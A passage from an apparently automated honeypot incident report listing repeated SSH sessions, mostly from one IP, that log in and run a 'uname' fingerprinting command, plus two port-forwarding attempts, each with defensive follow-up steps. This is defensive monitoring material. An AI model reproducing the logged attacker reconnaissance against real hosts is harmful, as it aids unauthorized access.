| **Last Seen** | 2026-07-15 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:52:50` | `cowrie.session.connect` |
| `2026-07-15 07:52:50` | `cowrie.client.version` |
| `2026-07-15 07:52:50` | `cowrie.client.kex` |
| `2026-07-15 07:52:51` | `cowrie.login.success` |
| `2026-07-15 07:52:52` | `cowrie.session.params` |
| `2026-07-15 07:52:52` | `cowrie.command.input` |
| `2026-07-15 07:52:52` | `cowrie.log.closed` |
| `2026-07-15 07:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c51845dd2c05

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:52 |
| **Last Seen** | 2026-07-15 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:52:57` | `cowrie.session.connect` |
| `2026-07-15 07:52:57` | `cowrie.client.version` |
| `2026-07-15 07:52:57` | `cowrie.client.kex` |
| `2026-07-15 07:52:58` | `cowrie.login.success` |
| `2026-07-15 07:52:59` | `cowrie.session.params` |
| `2026-07-15 07:52:59` | `cowrie.command.input` |
| `2026-07-15 07:52:59` | `cowrie.log.closed` |
| `2026-07-15 07:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5c37242bfd2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:04` | `cowrie.session.connect` |
| `2026-07-15 07:53:04` | `cowrie.client.version` |
| `2026-07-15 07:53:04` | `cowrie.client.kex` |
| `2026-07-15 07:53:04` | `cowrie.login.success` |
| `2026-07-15 07:53:05` | `cowrie.session.params` |
| `2026-07-15 07:53:05` | `cowrie.command.input` |
| `2026-07-15 07:53:06` | `cowrie.log.closed` |
| `2026-07-15 07:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3249c68e8e92

| Field | Detail |
|---|---|
| **Source IP** | `218.200.9[.]182` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:07` | `cowrie.session.connect` |
| `2026-07-15 07:53:08` | `cowrie.client.version` |
| `2026-07-15 07:53:08` | `cowrie.client.kex` |
| `2026-07-15 07:53:10` | `cowrie.login.success` |
| `2026-07-15 07:53:11` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.200.9[.]182` to AbuseIPDB if not already reported
- [ ] Block `218.200.9[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be3a2b36f3ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:11` | `cowrie.session.connect` |
| `2026-07-15 07:53:11` | `cowrie.client.version` |
| `2026-07-15 07:53:11` | `cowrie.client.kex` |
| `2026-07-15 07:53:12` | `cowrie.login.success` |
| `2026-07-15 07:53:12` | `cowrie.session.params` |
| `2026-07-15 07:53:12` | `cowrie.command.input` |
| `2026-07-15 07:53:12` | `cowrie.log.closed` |
| `2026-07-15 07:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7eb8a836125

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:17` | `cowrie.session.connect` |
| `2026-07-15 07:53:17` | `cowrie.client.version` |
| `2026-07-15 07:53:17` | `cowrie.client.kex` |
| `2026-07-15 07:53:18` | `cowrie.login.success` |
| `2026-07-15 07:53:19` | `cowrie.session.params` |
| `2026-07-15 07:53:19` | `cowrie.command.input` |
| `2026-07-15 07:53:19` | `cowrie.log.closed` |
| `2026-07-15 07:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf45e5faa64

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:24` | `cowrie.session.connect` |
| `2026-07-15 07:53:24` | `cowrie.client.version` |
| `2026-07-15 07:53:24` | `cowrie.client.kex` |
| `2026-07-15 07:53:24` | `cowrie.login.success` |
| `2026-07-15 07:53:24` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:53:25` | `cowrie.direct-tcpip.data` |
| `2026-07-15 07:53:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc2b40e83e1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:24` | `cowrie.session.connect` |
| `2026-07-15 07:53:24` | `cowrie.client.version` |
| `2026-07-15 07:53:24` | `cowrie.client.kex` |
| `2026-07-15 07:53:25` | `cowrie.login.success` |
| `2026-07-15 07:53:26` | `cowrie.session.params` |
| `2026-07-15 07:53:26` | `cowrie.command.input` |
| `2026-07-15 07:53:26` | `cowrie.log.closed` |
| `2026-07-15 07:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a03a370ce918

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:30` | `cowrie.session.connect` |
| `2026-07-15 07:53:30` | `cowrie.client.version` |
| `2026-07-15 07:53:30` | `cowrie.client.kex` |
| `2026-07-15 07:53:30` | `cowrie.login.success` |
| `2026-07-15 07:53:31` | `cowrie.session.params` |
| `2026-07-15 07:53:31` | `cowrie.command.input` |
| `2026-07-15 07:53:32` | `cowrie.log.closed` |
| `2026-07-15 07:53:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfd1ebf56de6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:36` | `cowrie.session.connect` |
| `2026-07-15 07:53:36` | `cowrie.client.version` |
| `2026-07-15 07:53:36` | `cowrie.client.kex` |
| `2026-07-15 07:53:37` | `cowrie.login.success` |
| `2026-07-15 07:53:38` | `cowrie.session.params` |
| `2026-07-15 07:53:38` | `cowrie.command.input` |
| `2026-07-15 07:53:38` | `cowrie.log.closed` |
| `2026-07-15 07:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92396069a631

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:42` | `cowrie.session.connect` |
| `2026-07-15 07:53:42` | `cowrie.client.version` |
| `2026-07-15 07:53:42` | `cowrie.client.kex` |
| `2026-07-15 07:53:42` | `cowrie.login.success` |
| `2026-07-15 07:53:43` | `cowrie.session.params` |
| `2026-07-15 07:53:43` | `cowrie.command.input` |
| `2026-07-15 07:53:44` | `cowrie.log.closed` |
| `2026-07-15 07:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f4e6d2ebaff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:48` | `cowrie.session.connect` |
| `2026-07-15 07:53:48` | `cowrie.client.version` |
| `2026-07-15 07:53:48` | `cowrie.client.kex` |
| `2026-07-15 07:53:49` | `cowrie.login.success` |
| `2026-07-15 07:53:50` | `cowrie.session.params` |
| `2026-07-15 07:53:50` | `cowrie.command.input` |
| `2026-07-15 07:53:50` | `cowrie.log.closed` |
| `2026-07-15 07:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6097771c2dc6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:53 |
| **Last Seen** | 2026-07-15 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:53:55` | `cowrie.session.connect` |
| `2026-07-15 07:53:55` | `cowrie.client.version` |
| `2026-07-15 07:53:55` | `cowrie.client.kex` |
| `2026-07-15 07:53:55` | `cowrie.login.success` |
| `2026-07-15 07:53:57` | `cowrie.session.params` |
| `2026-07-15 07:53:57` | `cowrie.command.input` |
| `2026-07-15 07:53:57` | `cowrie.log.closed` |
| `2026-07-15 07:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f4eca83b36e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:01` | `cowrie.session.connect` |
| `2026-07-15 07:54:01` | `cowrie.client.version` |
| `2026-07-15 07:54:01` | `cowrie.client.kex` |
| `2026-07-15 07:54:02` | `cowrie.login.success` |
| `2026-07-15 07:54:03` | `cowrie.session.params` |
| `2026-07-15 07:54:03` | `cowrie.command.input` |
| `2026-07-15 07:54:03` | `cowrie.log.closed` |
| `2026-07-15 07:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df69b601d3c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:07` | `cowrie.session.connect` |
| `2026-07-15 07:54:07` | `cowrie.client.version` |
| `2026-07-15 07:54:07` | `cowrie.client.kex` |
| `2026-07-15 07:54:09` | `cowrie.login.success` |
| `2026-07-15 07:54:10` | `cowrie.session.params` |
| `2026-07-15 07:54:10` | `cowrie.command.input` |
| `2026-07-15 07:54:10` | `cowrie.log.closed` |
| `2026-07-15 07:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edfc20bd8e2f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:13` | `cowrie.session.connect` |
| `2026-07-15 07:54:13` | `cowrie.client.version` |
| `2026-07-15 07:54:13` | `cowrie.client.kex` |
| `2026-07-15 07:54:14` | `cowrie.login.success` |
| `2026-07-15 07:54:15` | `cowrie.session.params` |
| `2026-07-15 07:54:15` | `cowrie.command.input` |
| `2026-07-15 07:54:15` | `cowrie.log.closed` |
| `2026-07-15 07:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ae7d622d873

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:19` | `cowrie.session.connect` |
| `2026-07-15 07:54:19` | `cowrie.client.version` |
| `2026-07-15 07:54:19` | `cowrie.client.kex` |
| `2026-07-15 07:54:20` | `cowrie.login.success` |
| `2026-07-15 07:54:21` | `cowrie.session.params` |
| `2026-07-15 07:54:21` | `cowrie.command.input` |
| `2026-07-15 07:54:21` | `cowrie.log.closed` |
| `2026-07-15 07:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c786bb9ca251

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:25` | `cowrie.session.connect` |
| `2026-07-15 07:54:25` | `cowrie.client.version` |
| `2026-07-15 07:54:25` | `cowrie.client.kex` |
| `2026-07-15 07:54:26` | `cowrie.login.success` |
| `2026-07-15 07:54:27` | `cowrie.session.params` |
| `2026-07-15 07:54:27` | `cowrie.command.input` |
| `2026-07-15 07:54:27` | `cowrie.log.closed` |
| `2026-07-15 07:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ae6b416bcbb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:31` | `cowrie.session.connect` |
| `2026-07-15 07:54:31` | `cowrie.client.version` |
| `2026-07-15 07:54:31` | `cowrie.client.kex` |
| `2026-07-15 07:54:32` | `cowrie.login.success` |
| `2026-07-15 07:54:33` | `cowrie.session.params` |
| `2026-07-15 07:54:33` | `cowrie.command.input` |
| `2026-07-15 07:54:33` | `cowrie.log.closed` |
| `2026-07-15 07:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff8ede919f15

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:37` | `cowrie.session.connect` |
| `2026-07-15 07:54:37` | `cowrie.client.version` |
| `2026-07-15 07:54:37` | `cowrie.client.kex` |
| `2026-07-15 07:54:38` | `cowrie.login.success` |
| `2026-07-15 07:54:39` | `cowrie.session.params` |
| `2026-07-15 07:54:39` | `cowrie.command.input` |
| `2026-07-15 07:54:39` | `cowrie.log.closed` |
| `2026-07-15 07:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b64d9663a41a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:43` | `cowrie.session.connect` |
| `2026-07-15 07:54:43` | `cowrie.client.version` |
| `2026-07-15 07:54:43` | `cowrie.client.kex` |
| `2026-07-15 07:54:44` | `cowrie.login.success` |
| `2026-07-15 07:54:45` | `cowrie.session.params` |
| `2026-07-15 07:54:45` | `cowrie.command.input` |
| `2026-07-15 07:54:45` | `cowrie.log.closed` |
| `2026-07-15 07:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ea9514c353c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:49` | `cowrie.session.connect` |
| `2026-07-15 07:54:49` | `cowrie.client.version` |
| `2026-07-15 07:54:49` | `cowrie.client.kex` |
| `2026-07-15 07:54:50` | `cowrie.login.success` |
| `2026-07-15 07:54:51` | `cowrie.session.params` |
| `2026-07-15 07:54:51` | `cowrie.command.input` |
| `2026-07-15 07:54:51` | `cowrie.log.closed` |
| `2026-07-15 07:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-268192fb710c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:54 |
| **Last Seen** | 2026-07-15 07:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:54:55` | `cowrie.session.connect` |
| `2026-07-15 07:54:55` | `cowrie.client.version` |
| `2026-07-15 07:54:55` | `cowrie.client.kex` |
| `2026-07-15 07:54:56` | `cowrie.login.success` |
| `2026-07-15 07:54:57` | `cowrie.session.params` |
| `2026-07-15 07:54:57` | `cowrie.command.input` |
| `2026-07-15 07:54:57` | `cowrie.log.closed` |
| `2026-07-15 07:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a05c07b7b6f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:01` | `cowrie.session.connect` |
| `2026-07-15 07:55:01` | `cowrie.client.version` |
| `2026-07-15 07:55:01` | `cowrie.client.kex` |
| `2026-07-15 07:55:02` | `cowrie.login.success` |
| `2026-07-15 07:55:03` | `cowrie.session.params` |
| `2026-07-15 07:55:03` | `cowrie.command.input` |
| `2026-07-15 07:55:03` | `cowrie.log.closed` |
| `2026-07-15 07:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d9090f6d43c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:07` | `cowrie.session.connect` |
| `2026-07-15 07:55:07` | `cowrie.client.version` |
| `2026-07-15 07:55:07` | `cowrie.client.kex` |
| `2026-07-15 07:55:08` | `cowrie.login.success` |
| `2026-07-15 07:55:08` | `cowrie.session.params` |
| `2026-07-15 07:55:08` | `cowrie.command.input` |
| `2026-07-15 07:55:09` | `cowrie.log.closed` |
| `2026-07-15 07:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4798835283ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:55 |
| **Last Seen** | 2026-07-15 07:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:55:13` | `cowrie.session.connect` |
| `2026-07-15 07:55:14` | `cowrie.client.version` |
| `2026-07-15 07:55:14` | `cowrie.client.kex` |
| `2026-07-15 07:55:14` | `cowrie.login.success` |
| `2026-07-15 07:55:16` | `cowrie.session.params` |
| `2026-07-15 07:55:16` | `cowrie.command.input` |
